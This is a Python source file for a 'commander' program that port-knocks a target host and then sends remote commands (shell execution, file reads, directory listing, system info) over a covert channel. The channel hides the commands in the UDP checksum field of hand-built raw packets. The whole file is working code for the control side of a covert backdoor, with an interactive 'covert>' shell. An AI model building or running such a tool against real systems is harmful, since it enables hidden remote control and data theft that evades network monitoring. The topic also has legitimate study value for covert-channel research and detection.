#!/usr/bin/env python3
"""
Commander Program - Integrated Port Knock + Raw Socket Covert Channel
Performs TCP port knock, then sends commands via UDP raw socket covert channel.

REQUIRES: Root/Administrator privileges for raw sockets
Usage: sudo python3 commander.py <target_host>
"""

import socket
import struct
import time
import sys
from enum import IntEnum

# Configuration
KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
COMMAND_PORT = 8888  # UDP port for covert channel


class CommandType(IntEnum):
    """Commands encoded in UDP checksum field"""
    PING = 0x1234
    SHELL_EXEC = 0x2345
    READ_FILE = 0x3456
    WRITE_FILE = 0x4567
    LIST_DIR = 0x5678
    SYSINFO = 0x6789
    DISCONNECT = 0x789A
    ACK = 0x9ABC
    ERROR = 0xABCD


class RawSocketProtocol:
    """Raw socket protocol for covert communication"""

    def __init__(self):
        self.sequence = 0

    def calculate_checksum(self, data):
        """Calculate checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'

        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word

        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16

        return ~checksum & 0xFFFF

    def create_ip_header(self, src_ip, dst_ip, total_length):
        """Create IP header"""
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = total_length
        ip_id = self.sequence & 0xFFFF
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)

        ip_ihl_version = (ip_version << 4) + ip_ihl

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_version, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto,
                                ip_check, ip_saddr, ip_daddr)

        ip_check = self.calculate_checksum(ip_header)

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_version, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto,
                                ip_check, ip_saddr, ip_daddr)

        return ip_header

    def create_udp_packet(self, src_ip, dst_ip, src_port, dst_port,
                          payload, command_type):
        """Create UDP packet with command in checksum"""
        udp_length = 8 + len(payload)
        udp_checksum = int(command_type)  # COVERT CHANNEL

        udp_header = struct.pack('!HHHH',
                                 src_port, dst_port,
                                 udp_length, udp_checksum)

        total_length = 20 + len(udp_header) + len(payload)
        ip_header = self.create_ip_header(src_ip, dst_ip, total_length)

        packet = ip_header + udp_header + payload
        return packet

    def send_packet(self, src_ip, dst_ip, src_port, dst_port,
                    command_type, payload=b''):
        """Send covert packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            self.sequence += 1
            actual_src_port = self.sequence & 0xFFFF

            packet = self.create_udp_packet(
                src_ip, dst_ip,
                actual_src_port, dst_port,
                payload, command_type
            )

            sock.sendto(packet, (dst_ip, 0))
            sock.close()
            return True

        except PermissionError:
            print("[!] Raw sockets require root privileges")
            print("[!] Run with: sudo python3 commander.py <host>")
            return False
        except Exception as e:
            print(f"[!] Error sending: {e}")
            return False


class Commander:
    """
    Commander that:
    1. Performs TCP port knock sequence
    2. Sends commands via UDP raw socket covert channel
    """

    def __init__(self, target_host):
        self.target_host = target_host
        self.knock_ports = KNOCK_SEQUENCE
        self.command_port = COMMAND_PORT
        self.source_ip = self.get_local_ip()
        self.protocol = RawSocketProtocol()

    def get_local_ip(self):
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"

    def perform_port_knock(self):
        """Perform TCP port knock sequence"""
        print("\n" + "=" * 60)
        print("PHASE 1: TCP Port Knock Authentication")
        print("=" * 60)
        print(f"Target: {self.target_host}")
        print(f"Sequence: {self.knock_ports}")
        print()

        for port in self.knock_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                print(f"[+] Knocking on TCP port {port}...", end=" ")
                sock.connect((self.target_host, port))
                sock.close()
                print("✓")
                time.sleep(0.5)
            except Exception as e:
                print(f"✗ ({e})")

        print("\n[+] Port knock sequence complete!")
        print("[*] Authorization granted for covert channel")
        print("=" * 60)
        time.sleep(1)

    def send_covert_command(self, command_type, payload=b''):
        """Send command via raw socket covert channel"""
        print(f"\n[→] Sending covert command: {command_type.name}")
        print(f"    Encoding: UDP checksum = 0x{int(command_type):04X}")
        print(f"    Transport: UDP port {self.command_port}")
        if payload:
            preview = payload[:50].decode('utf-8', errors='ignore')
            print(f"    Payload: {preview}")

        success = self.protocol.send_packet(
            self.source_ip,
            self.target_host,
            0,  # Will be set to sequence
            self.command_port,
            command_type,
            payload
        )

        if success:
            print(f"[✓] Packet sent successfully")
        else:
            print(f"[✗] Failed to send packet")

        return success

    def interactive_session(self):
        """Interactive command session"""
        print("\n" + "=" * 60)
        print("Commander - Port Knock + Covert Channel")
        print("=" * 60)
        print(f"Target: {self.target_host}:{self.command_port}")
        print(f"Source: {self.source_ip}")
        print("=" * 60)
        print()

        # Perform initial port knock
        self.perform_port_knock()

        print("\n" + "=" * 60)
        print("PHASE 2: Covert Channel Command Interface")
        print("=" * 60)
        print("\nAvailable Commands:")
        print("  knock             - Re-authenticate via port knock")
        print("  ping              - Send ping (0x1234)")
        print("  shell <cmd>       - Execute shell command (0x2345)")
        print("  read <file>       - Read file (0x3456)")
        print("  ls [dir]          - List directory (0x5678)")
        print("  sysinfo           - Get system info (0x6789)")
        print("  disconnect        - End session (0x789A)")
        print("  exit              - Exit commander")
        print("=" * 60)
        print()

        while True:
            try:
                user_input = input("covert> ").strip()

                if not user_input:
                    continue

                parts = user_input.split(maxsplit=1)
                cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ''

                if cmd == 'exit':
                    print("[*] Exiting commander...")
                    break

                elif cmd == 'knock':
                    self.perform_port_knock()

                elif cmd == 'ping':
                    self.send_covert_command(CommandType.PING)

                elif cmd == 'shell':
                    if args:
                        self.send_covert_command(CommandType.SHELL_EXEC,
                                                 args.encode('utf-8'))
                    else:
                        print("[!] Usage: shell <command>")

                elif cmd == 'read':
                    if args:
                        self.send_covert_command(CommandType.READ_FILE,
                                                 args.encode('utf-8'))
                    else:
                        print("[!] Usage: read <filepath>")

                elif cmd == 'ls':
                    path = args if args else '.'
                    self.send_covert_command(CommandType.LIST_DIR,
                                             path.encode('utf-8'))

                elif cmd == 'sysinfo':
                    self.send_covert_command(CommandType.SYSINFO)

                elif cmd == 'disconnect':
                    self.send_covert_command(CommandType.DISCONNECT)
                    print("\n[*] Disconnect sent - authorization revoked on client")
                    print("[*] Exiting commander...")
                    break

                else:
                    print(f"[!] Unknown command: {cmd}")
                    print("[!] Type a valid command or 'exit' to quit")

                time.sleep(0.3)

            except KeyboardInterrupt:
                print("\n[*] Interrupted by user")
                print("[*] Sending disconnect...")
                try:
                    self.send_covert_command(CommandType.DISCONNECT)
                except:
                    pass
                break
            except Exception as e:
                print(f"[!] Error: {e}")


def main():
    print("=" * 60)
    print("Commander Program")
    print("=" * 60)
    print("Requires: Root/Administrator privileges for raw sockets")
    print()

    if len(sys.argv) < 2:
        print("Usage: sudo python3 commander.py <target_host>")
        print("\nExample:")
        print("  sudo python3 commander.py 192.168.1.100")
        print("  sudo python3 commander.py localhost")
        sys.exit(1)

    target_host = sys.argv[1]

    commander = Commander(target_host)

    try:
        commander.interactive_session()
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()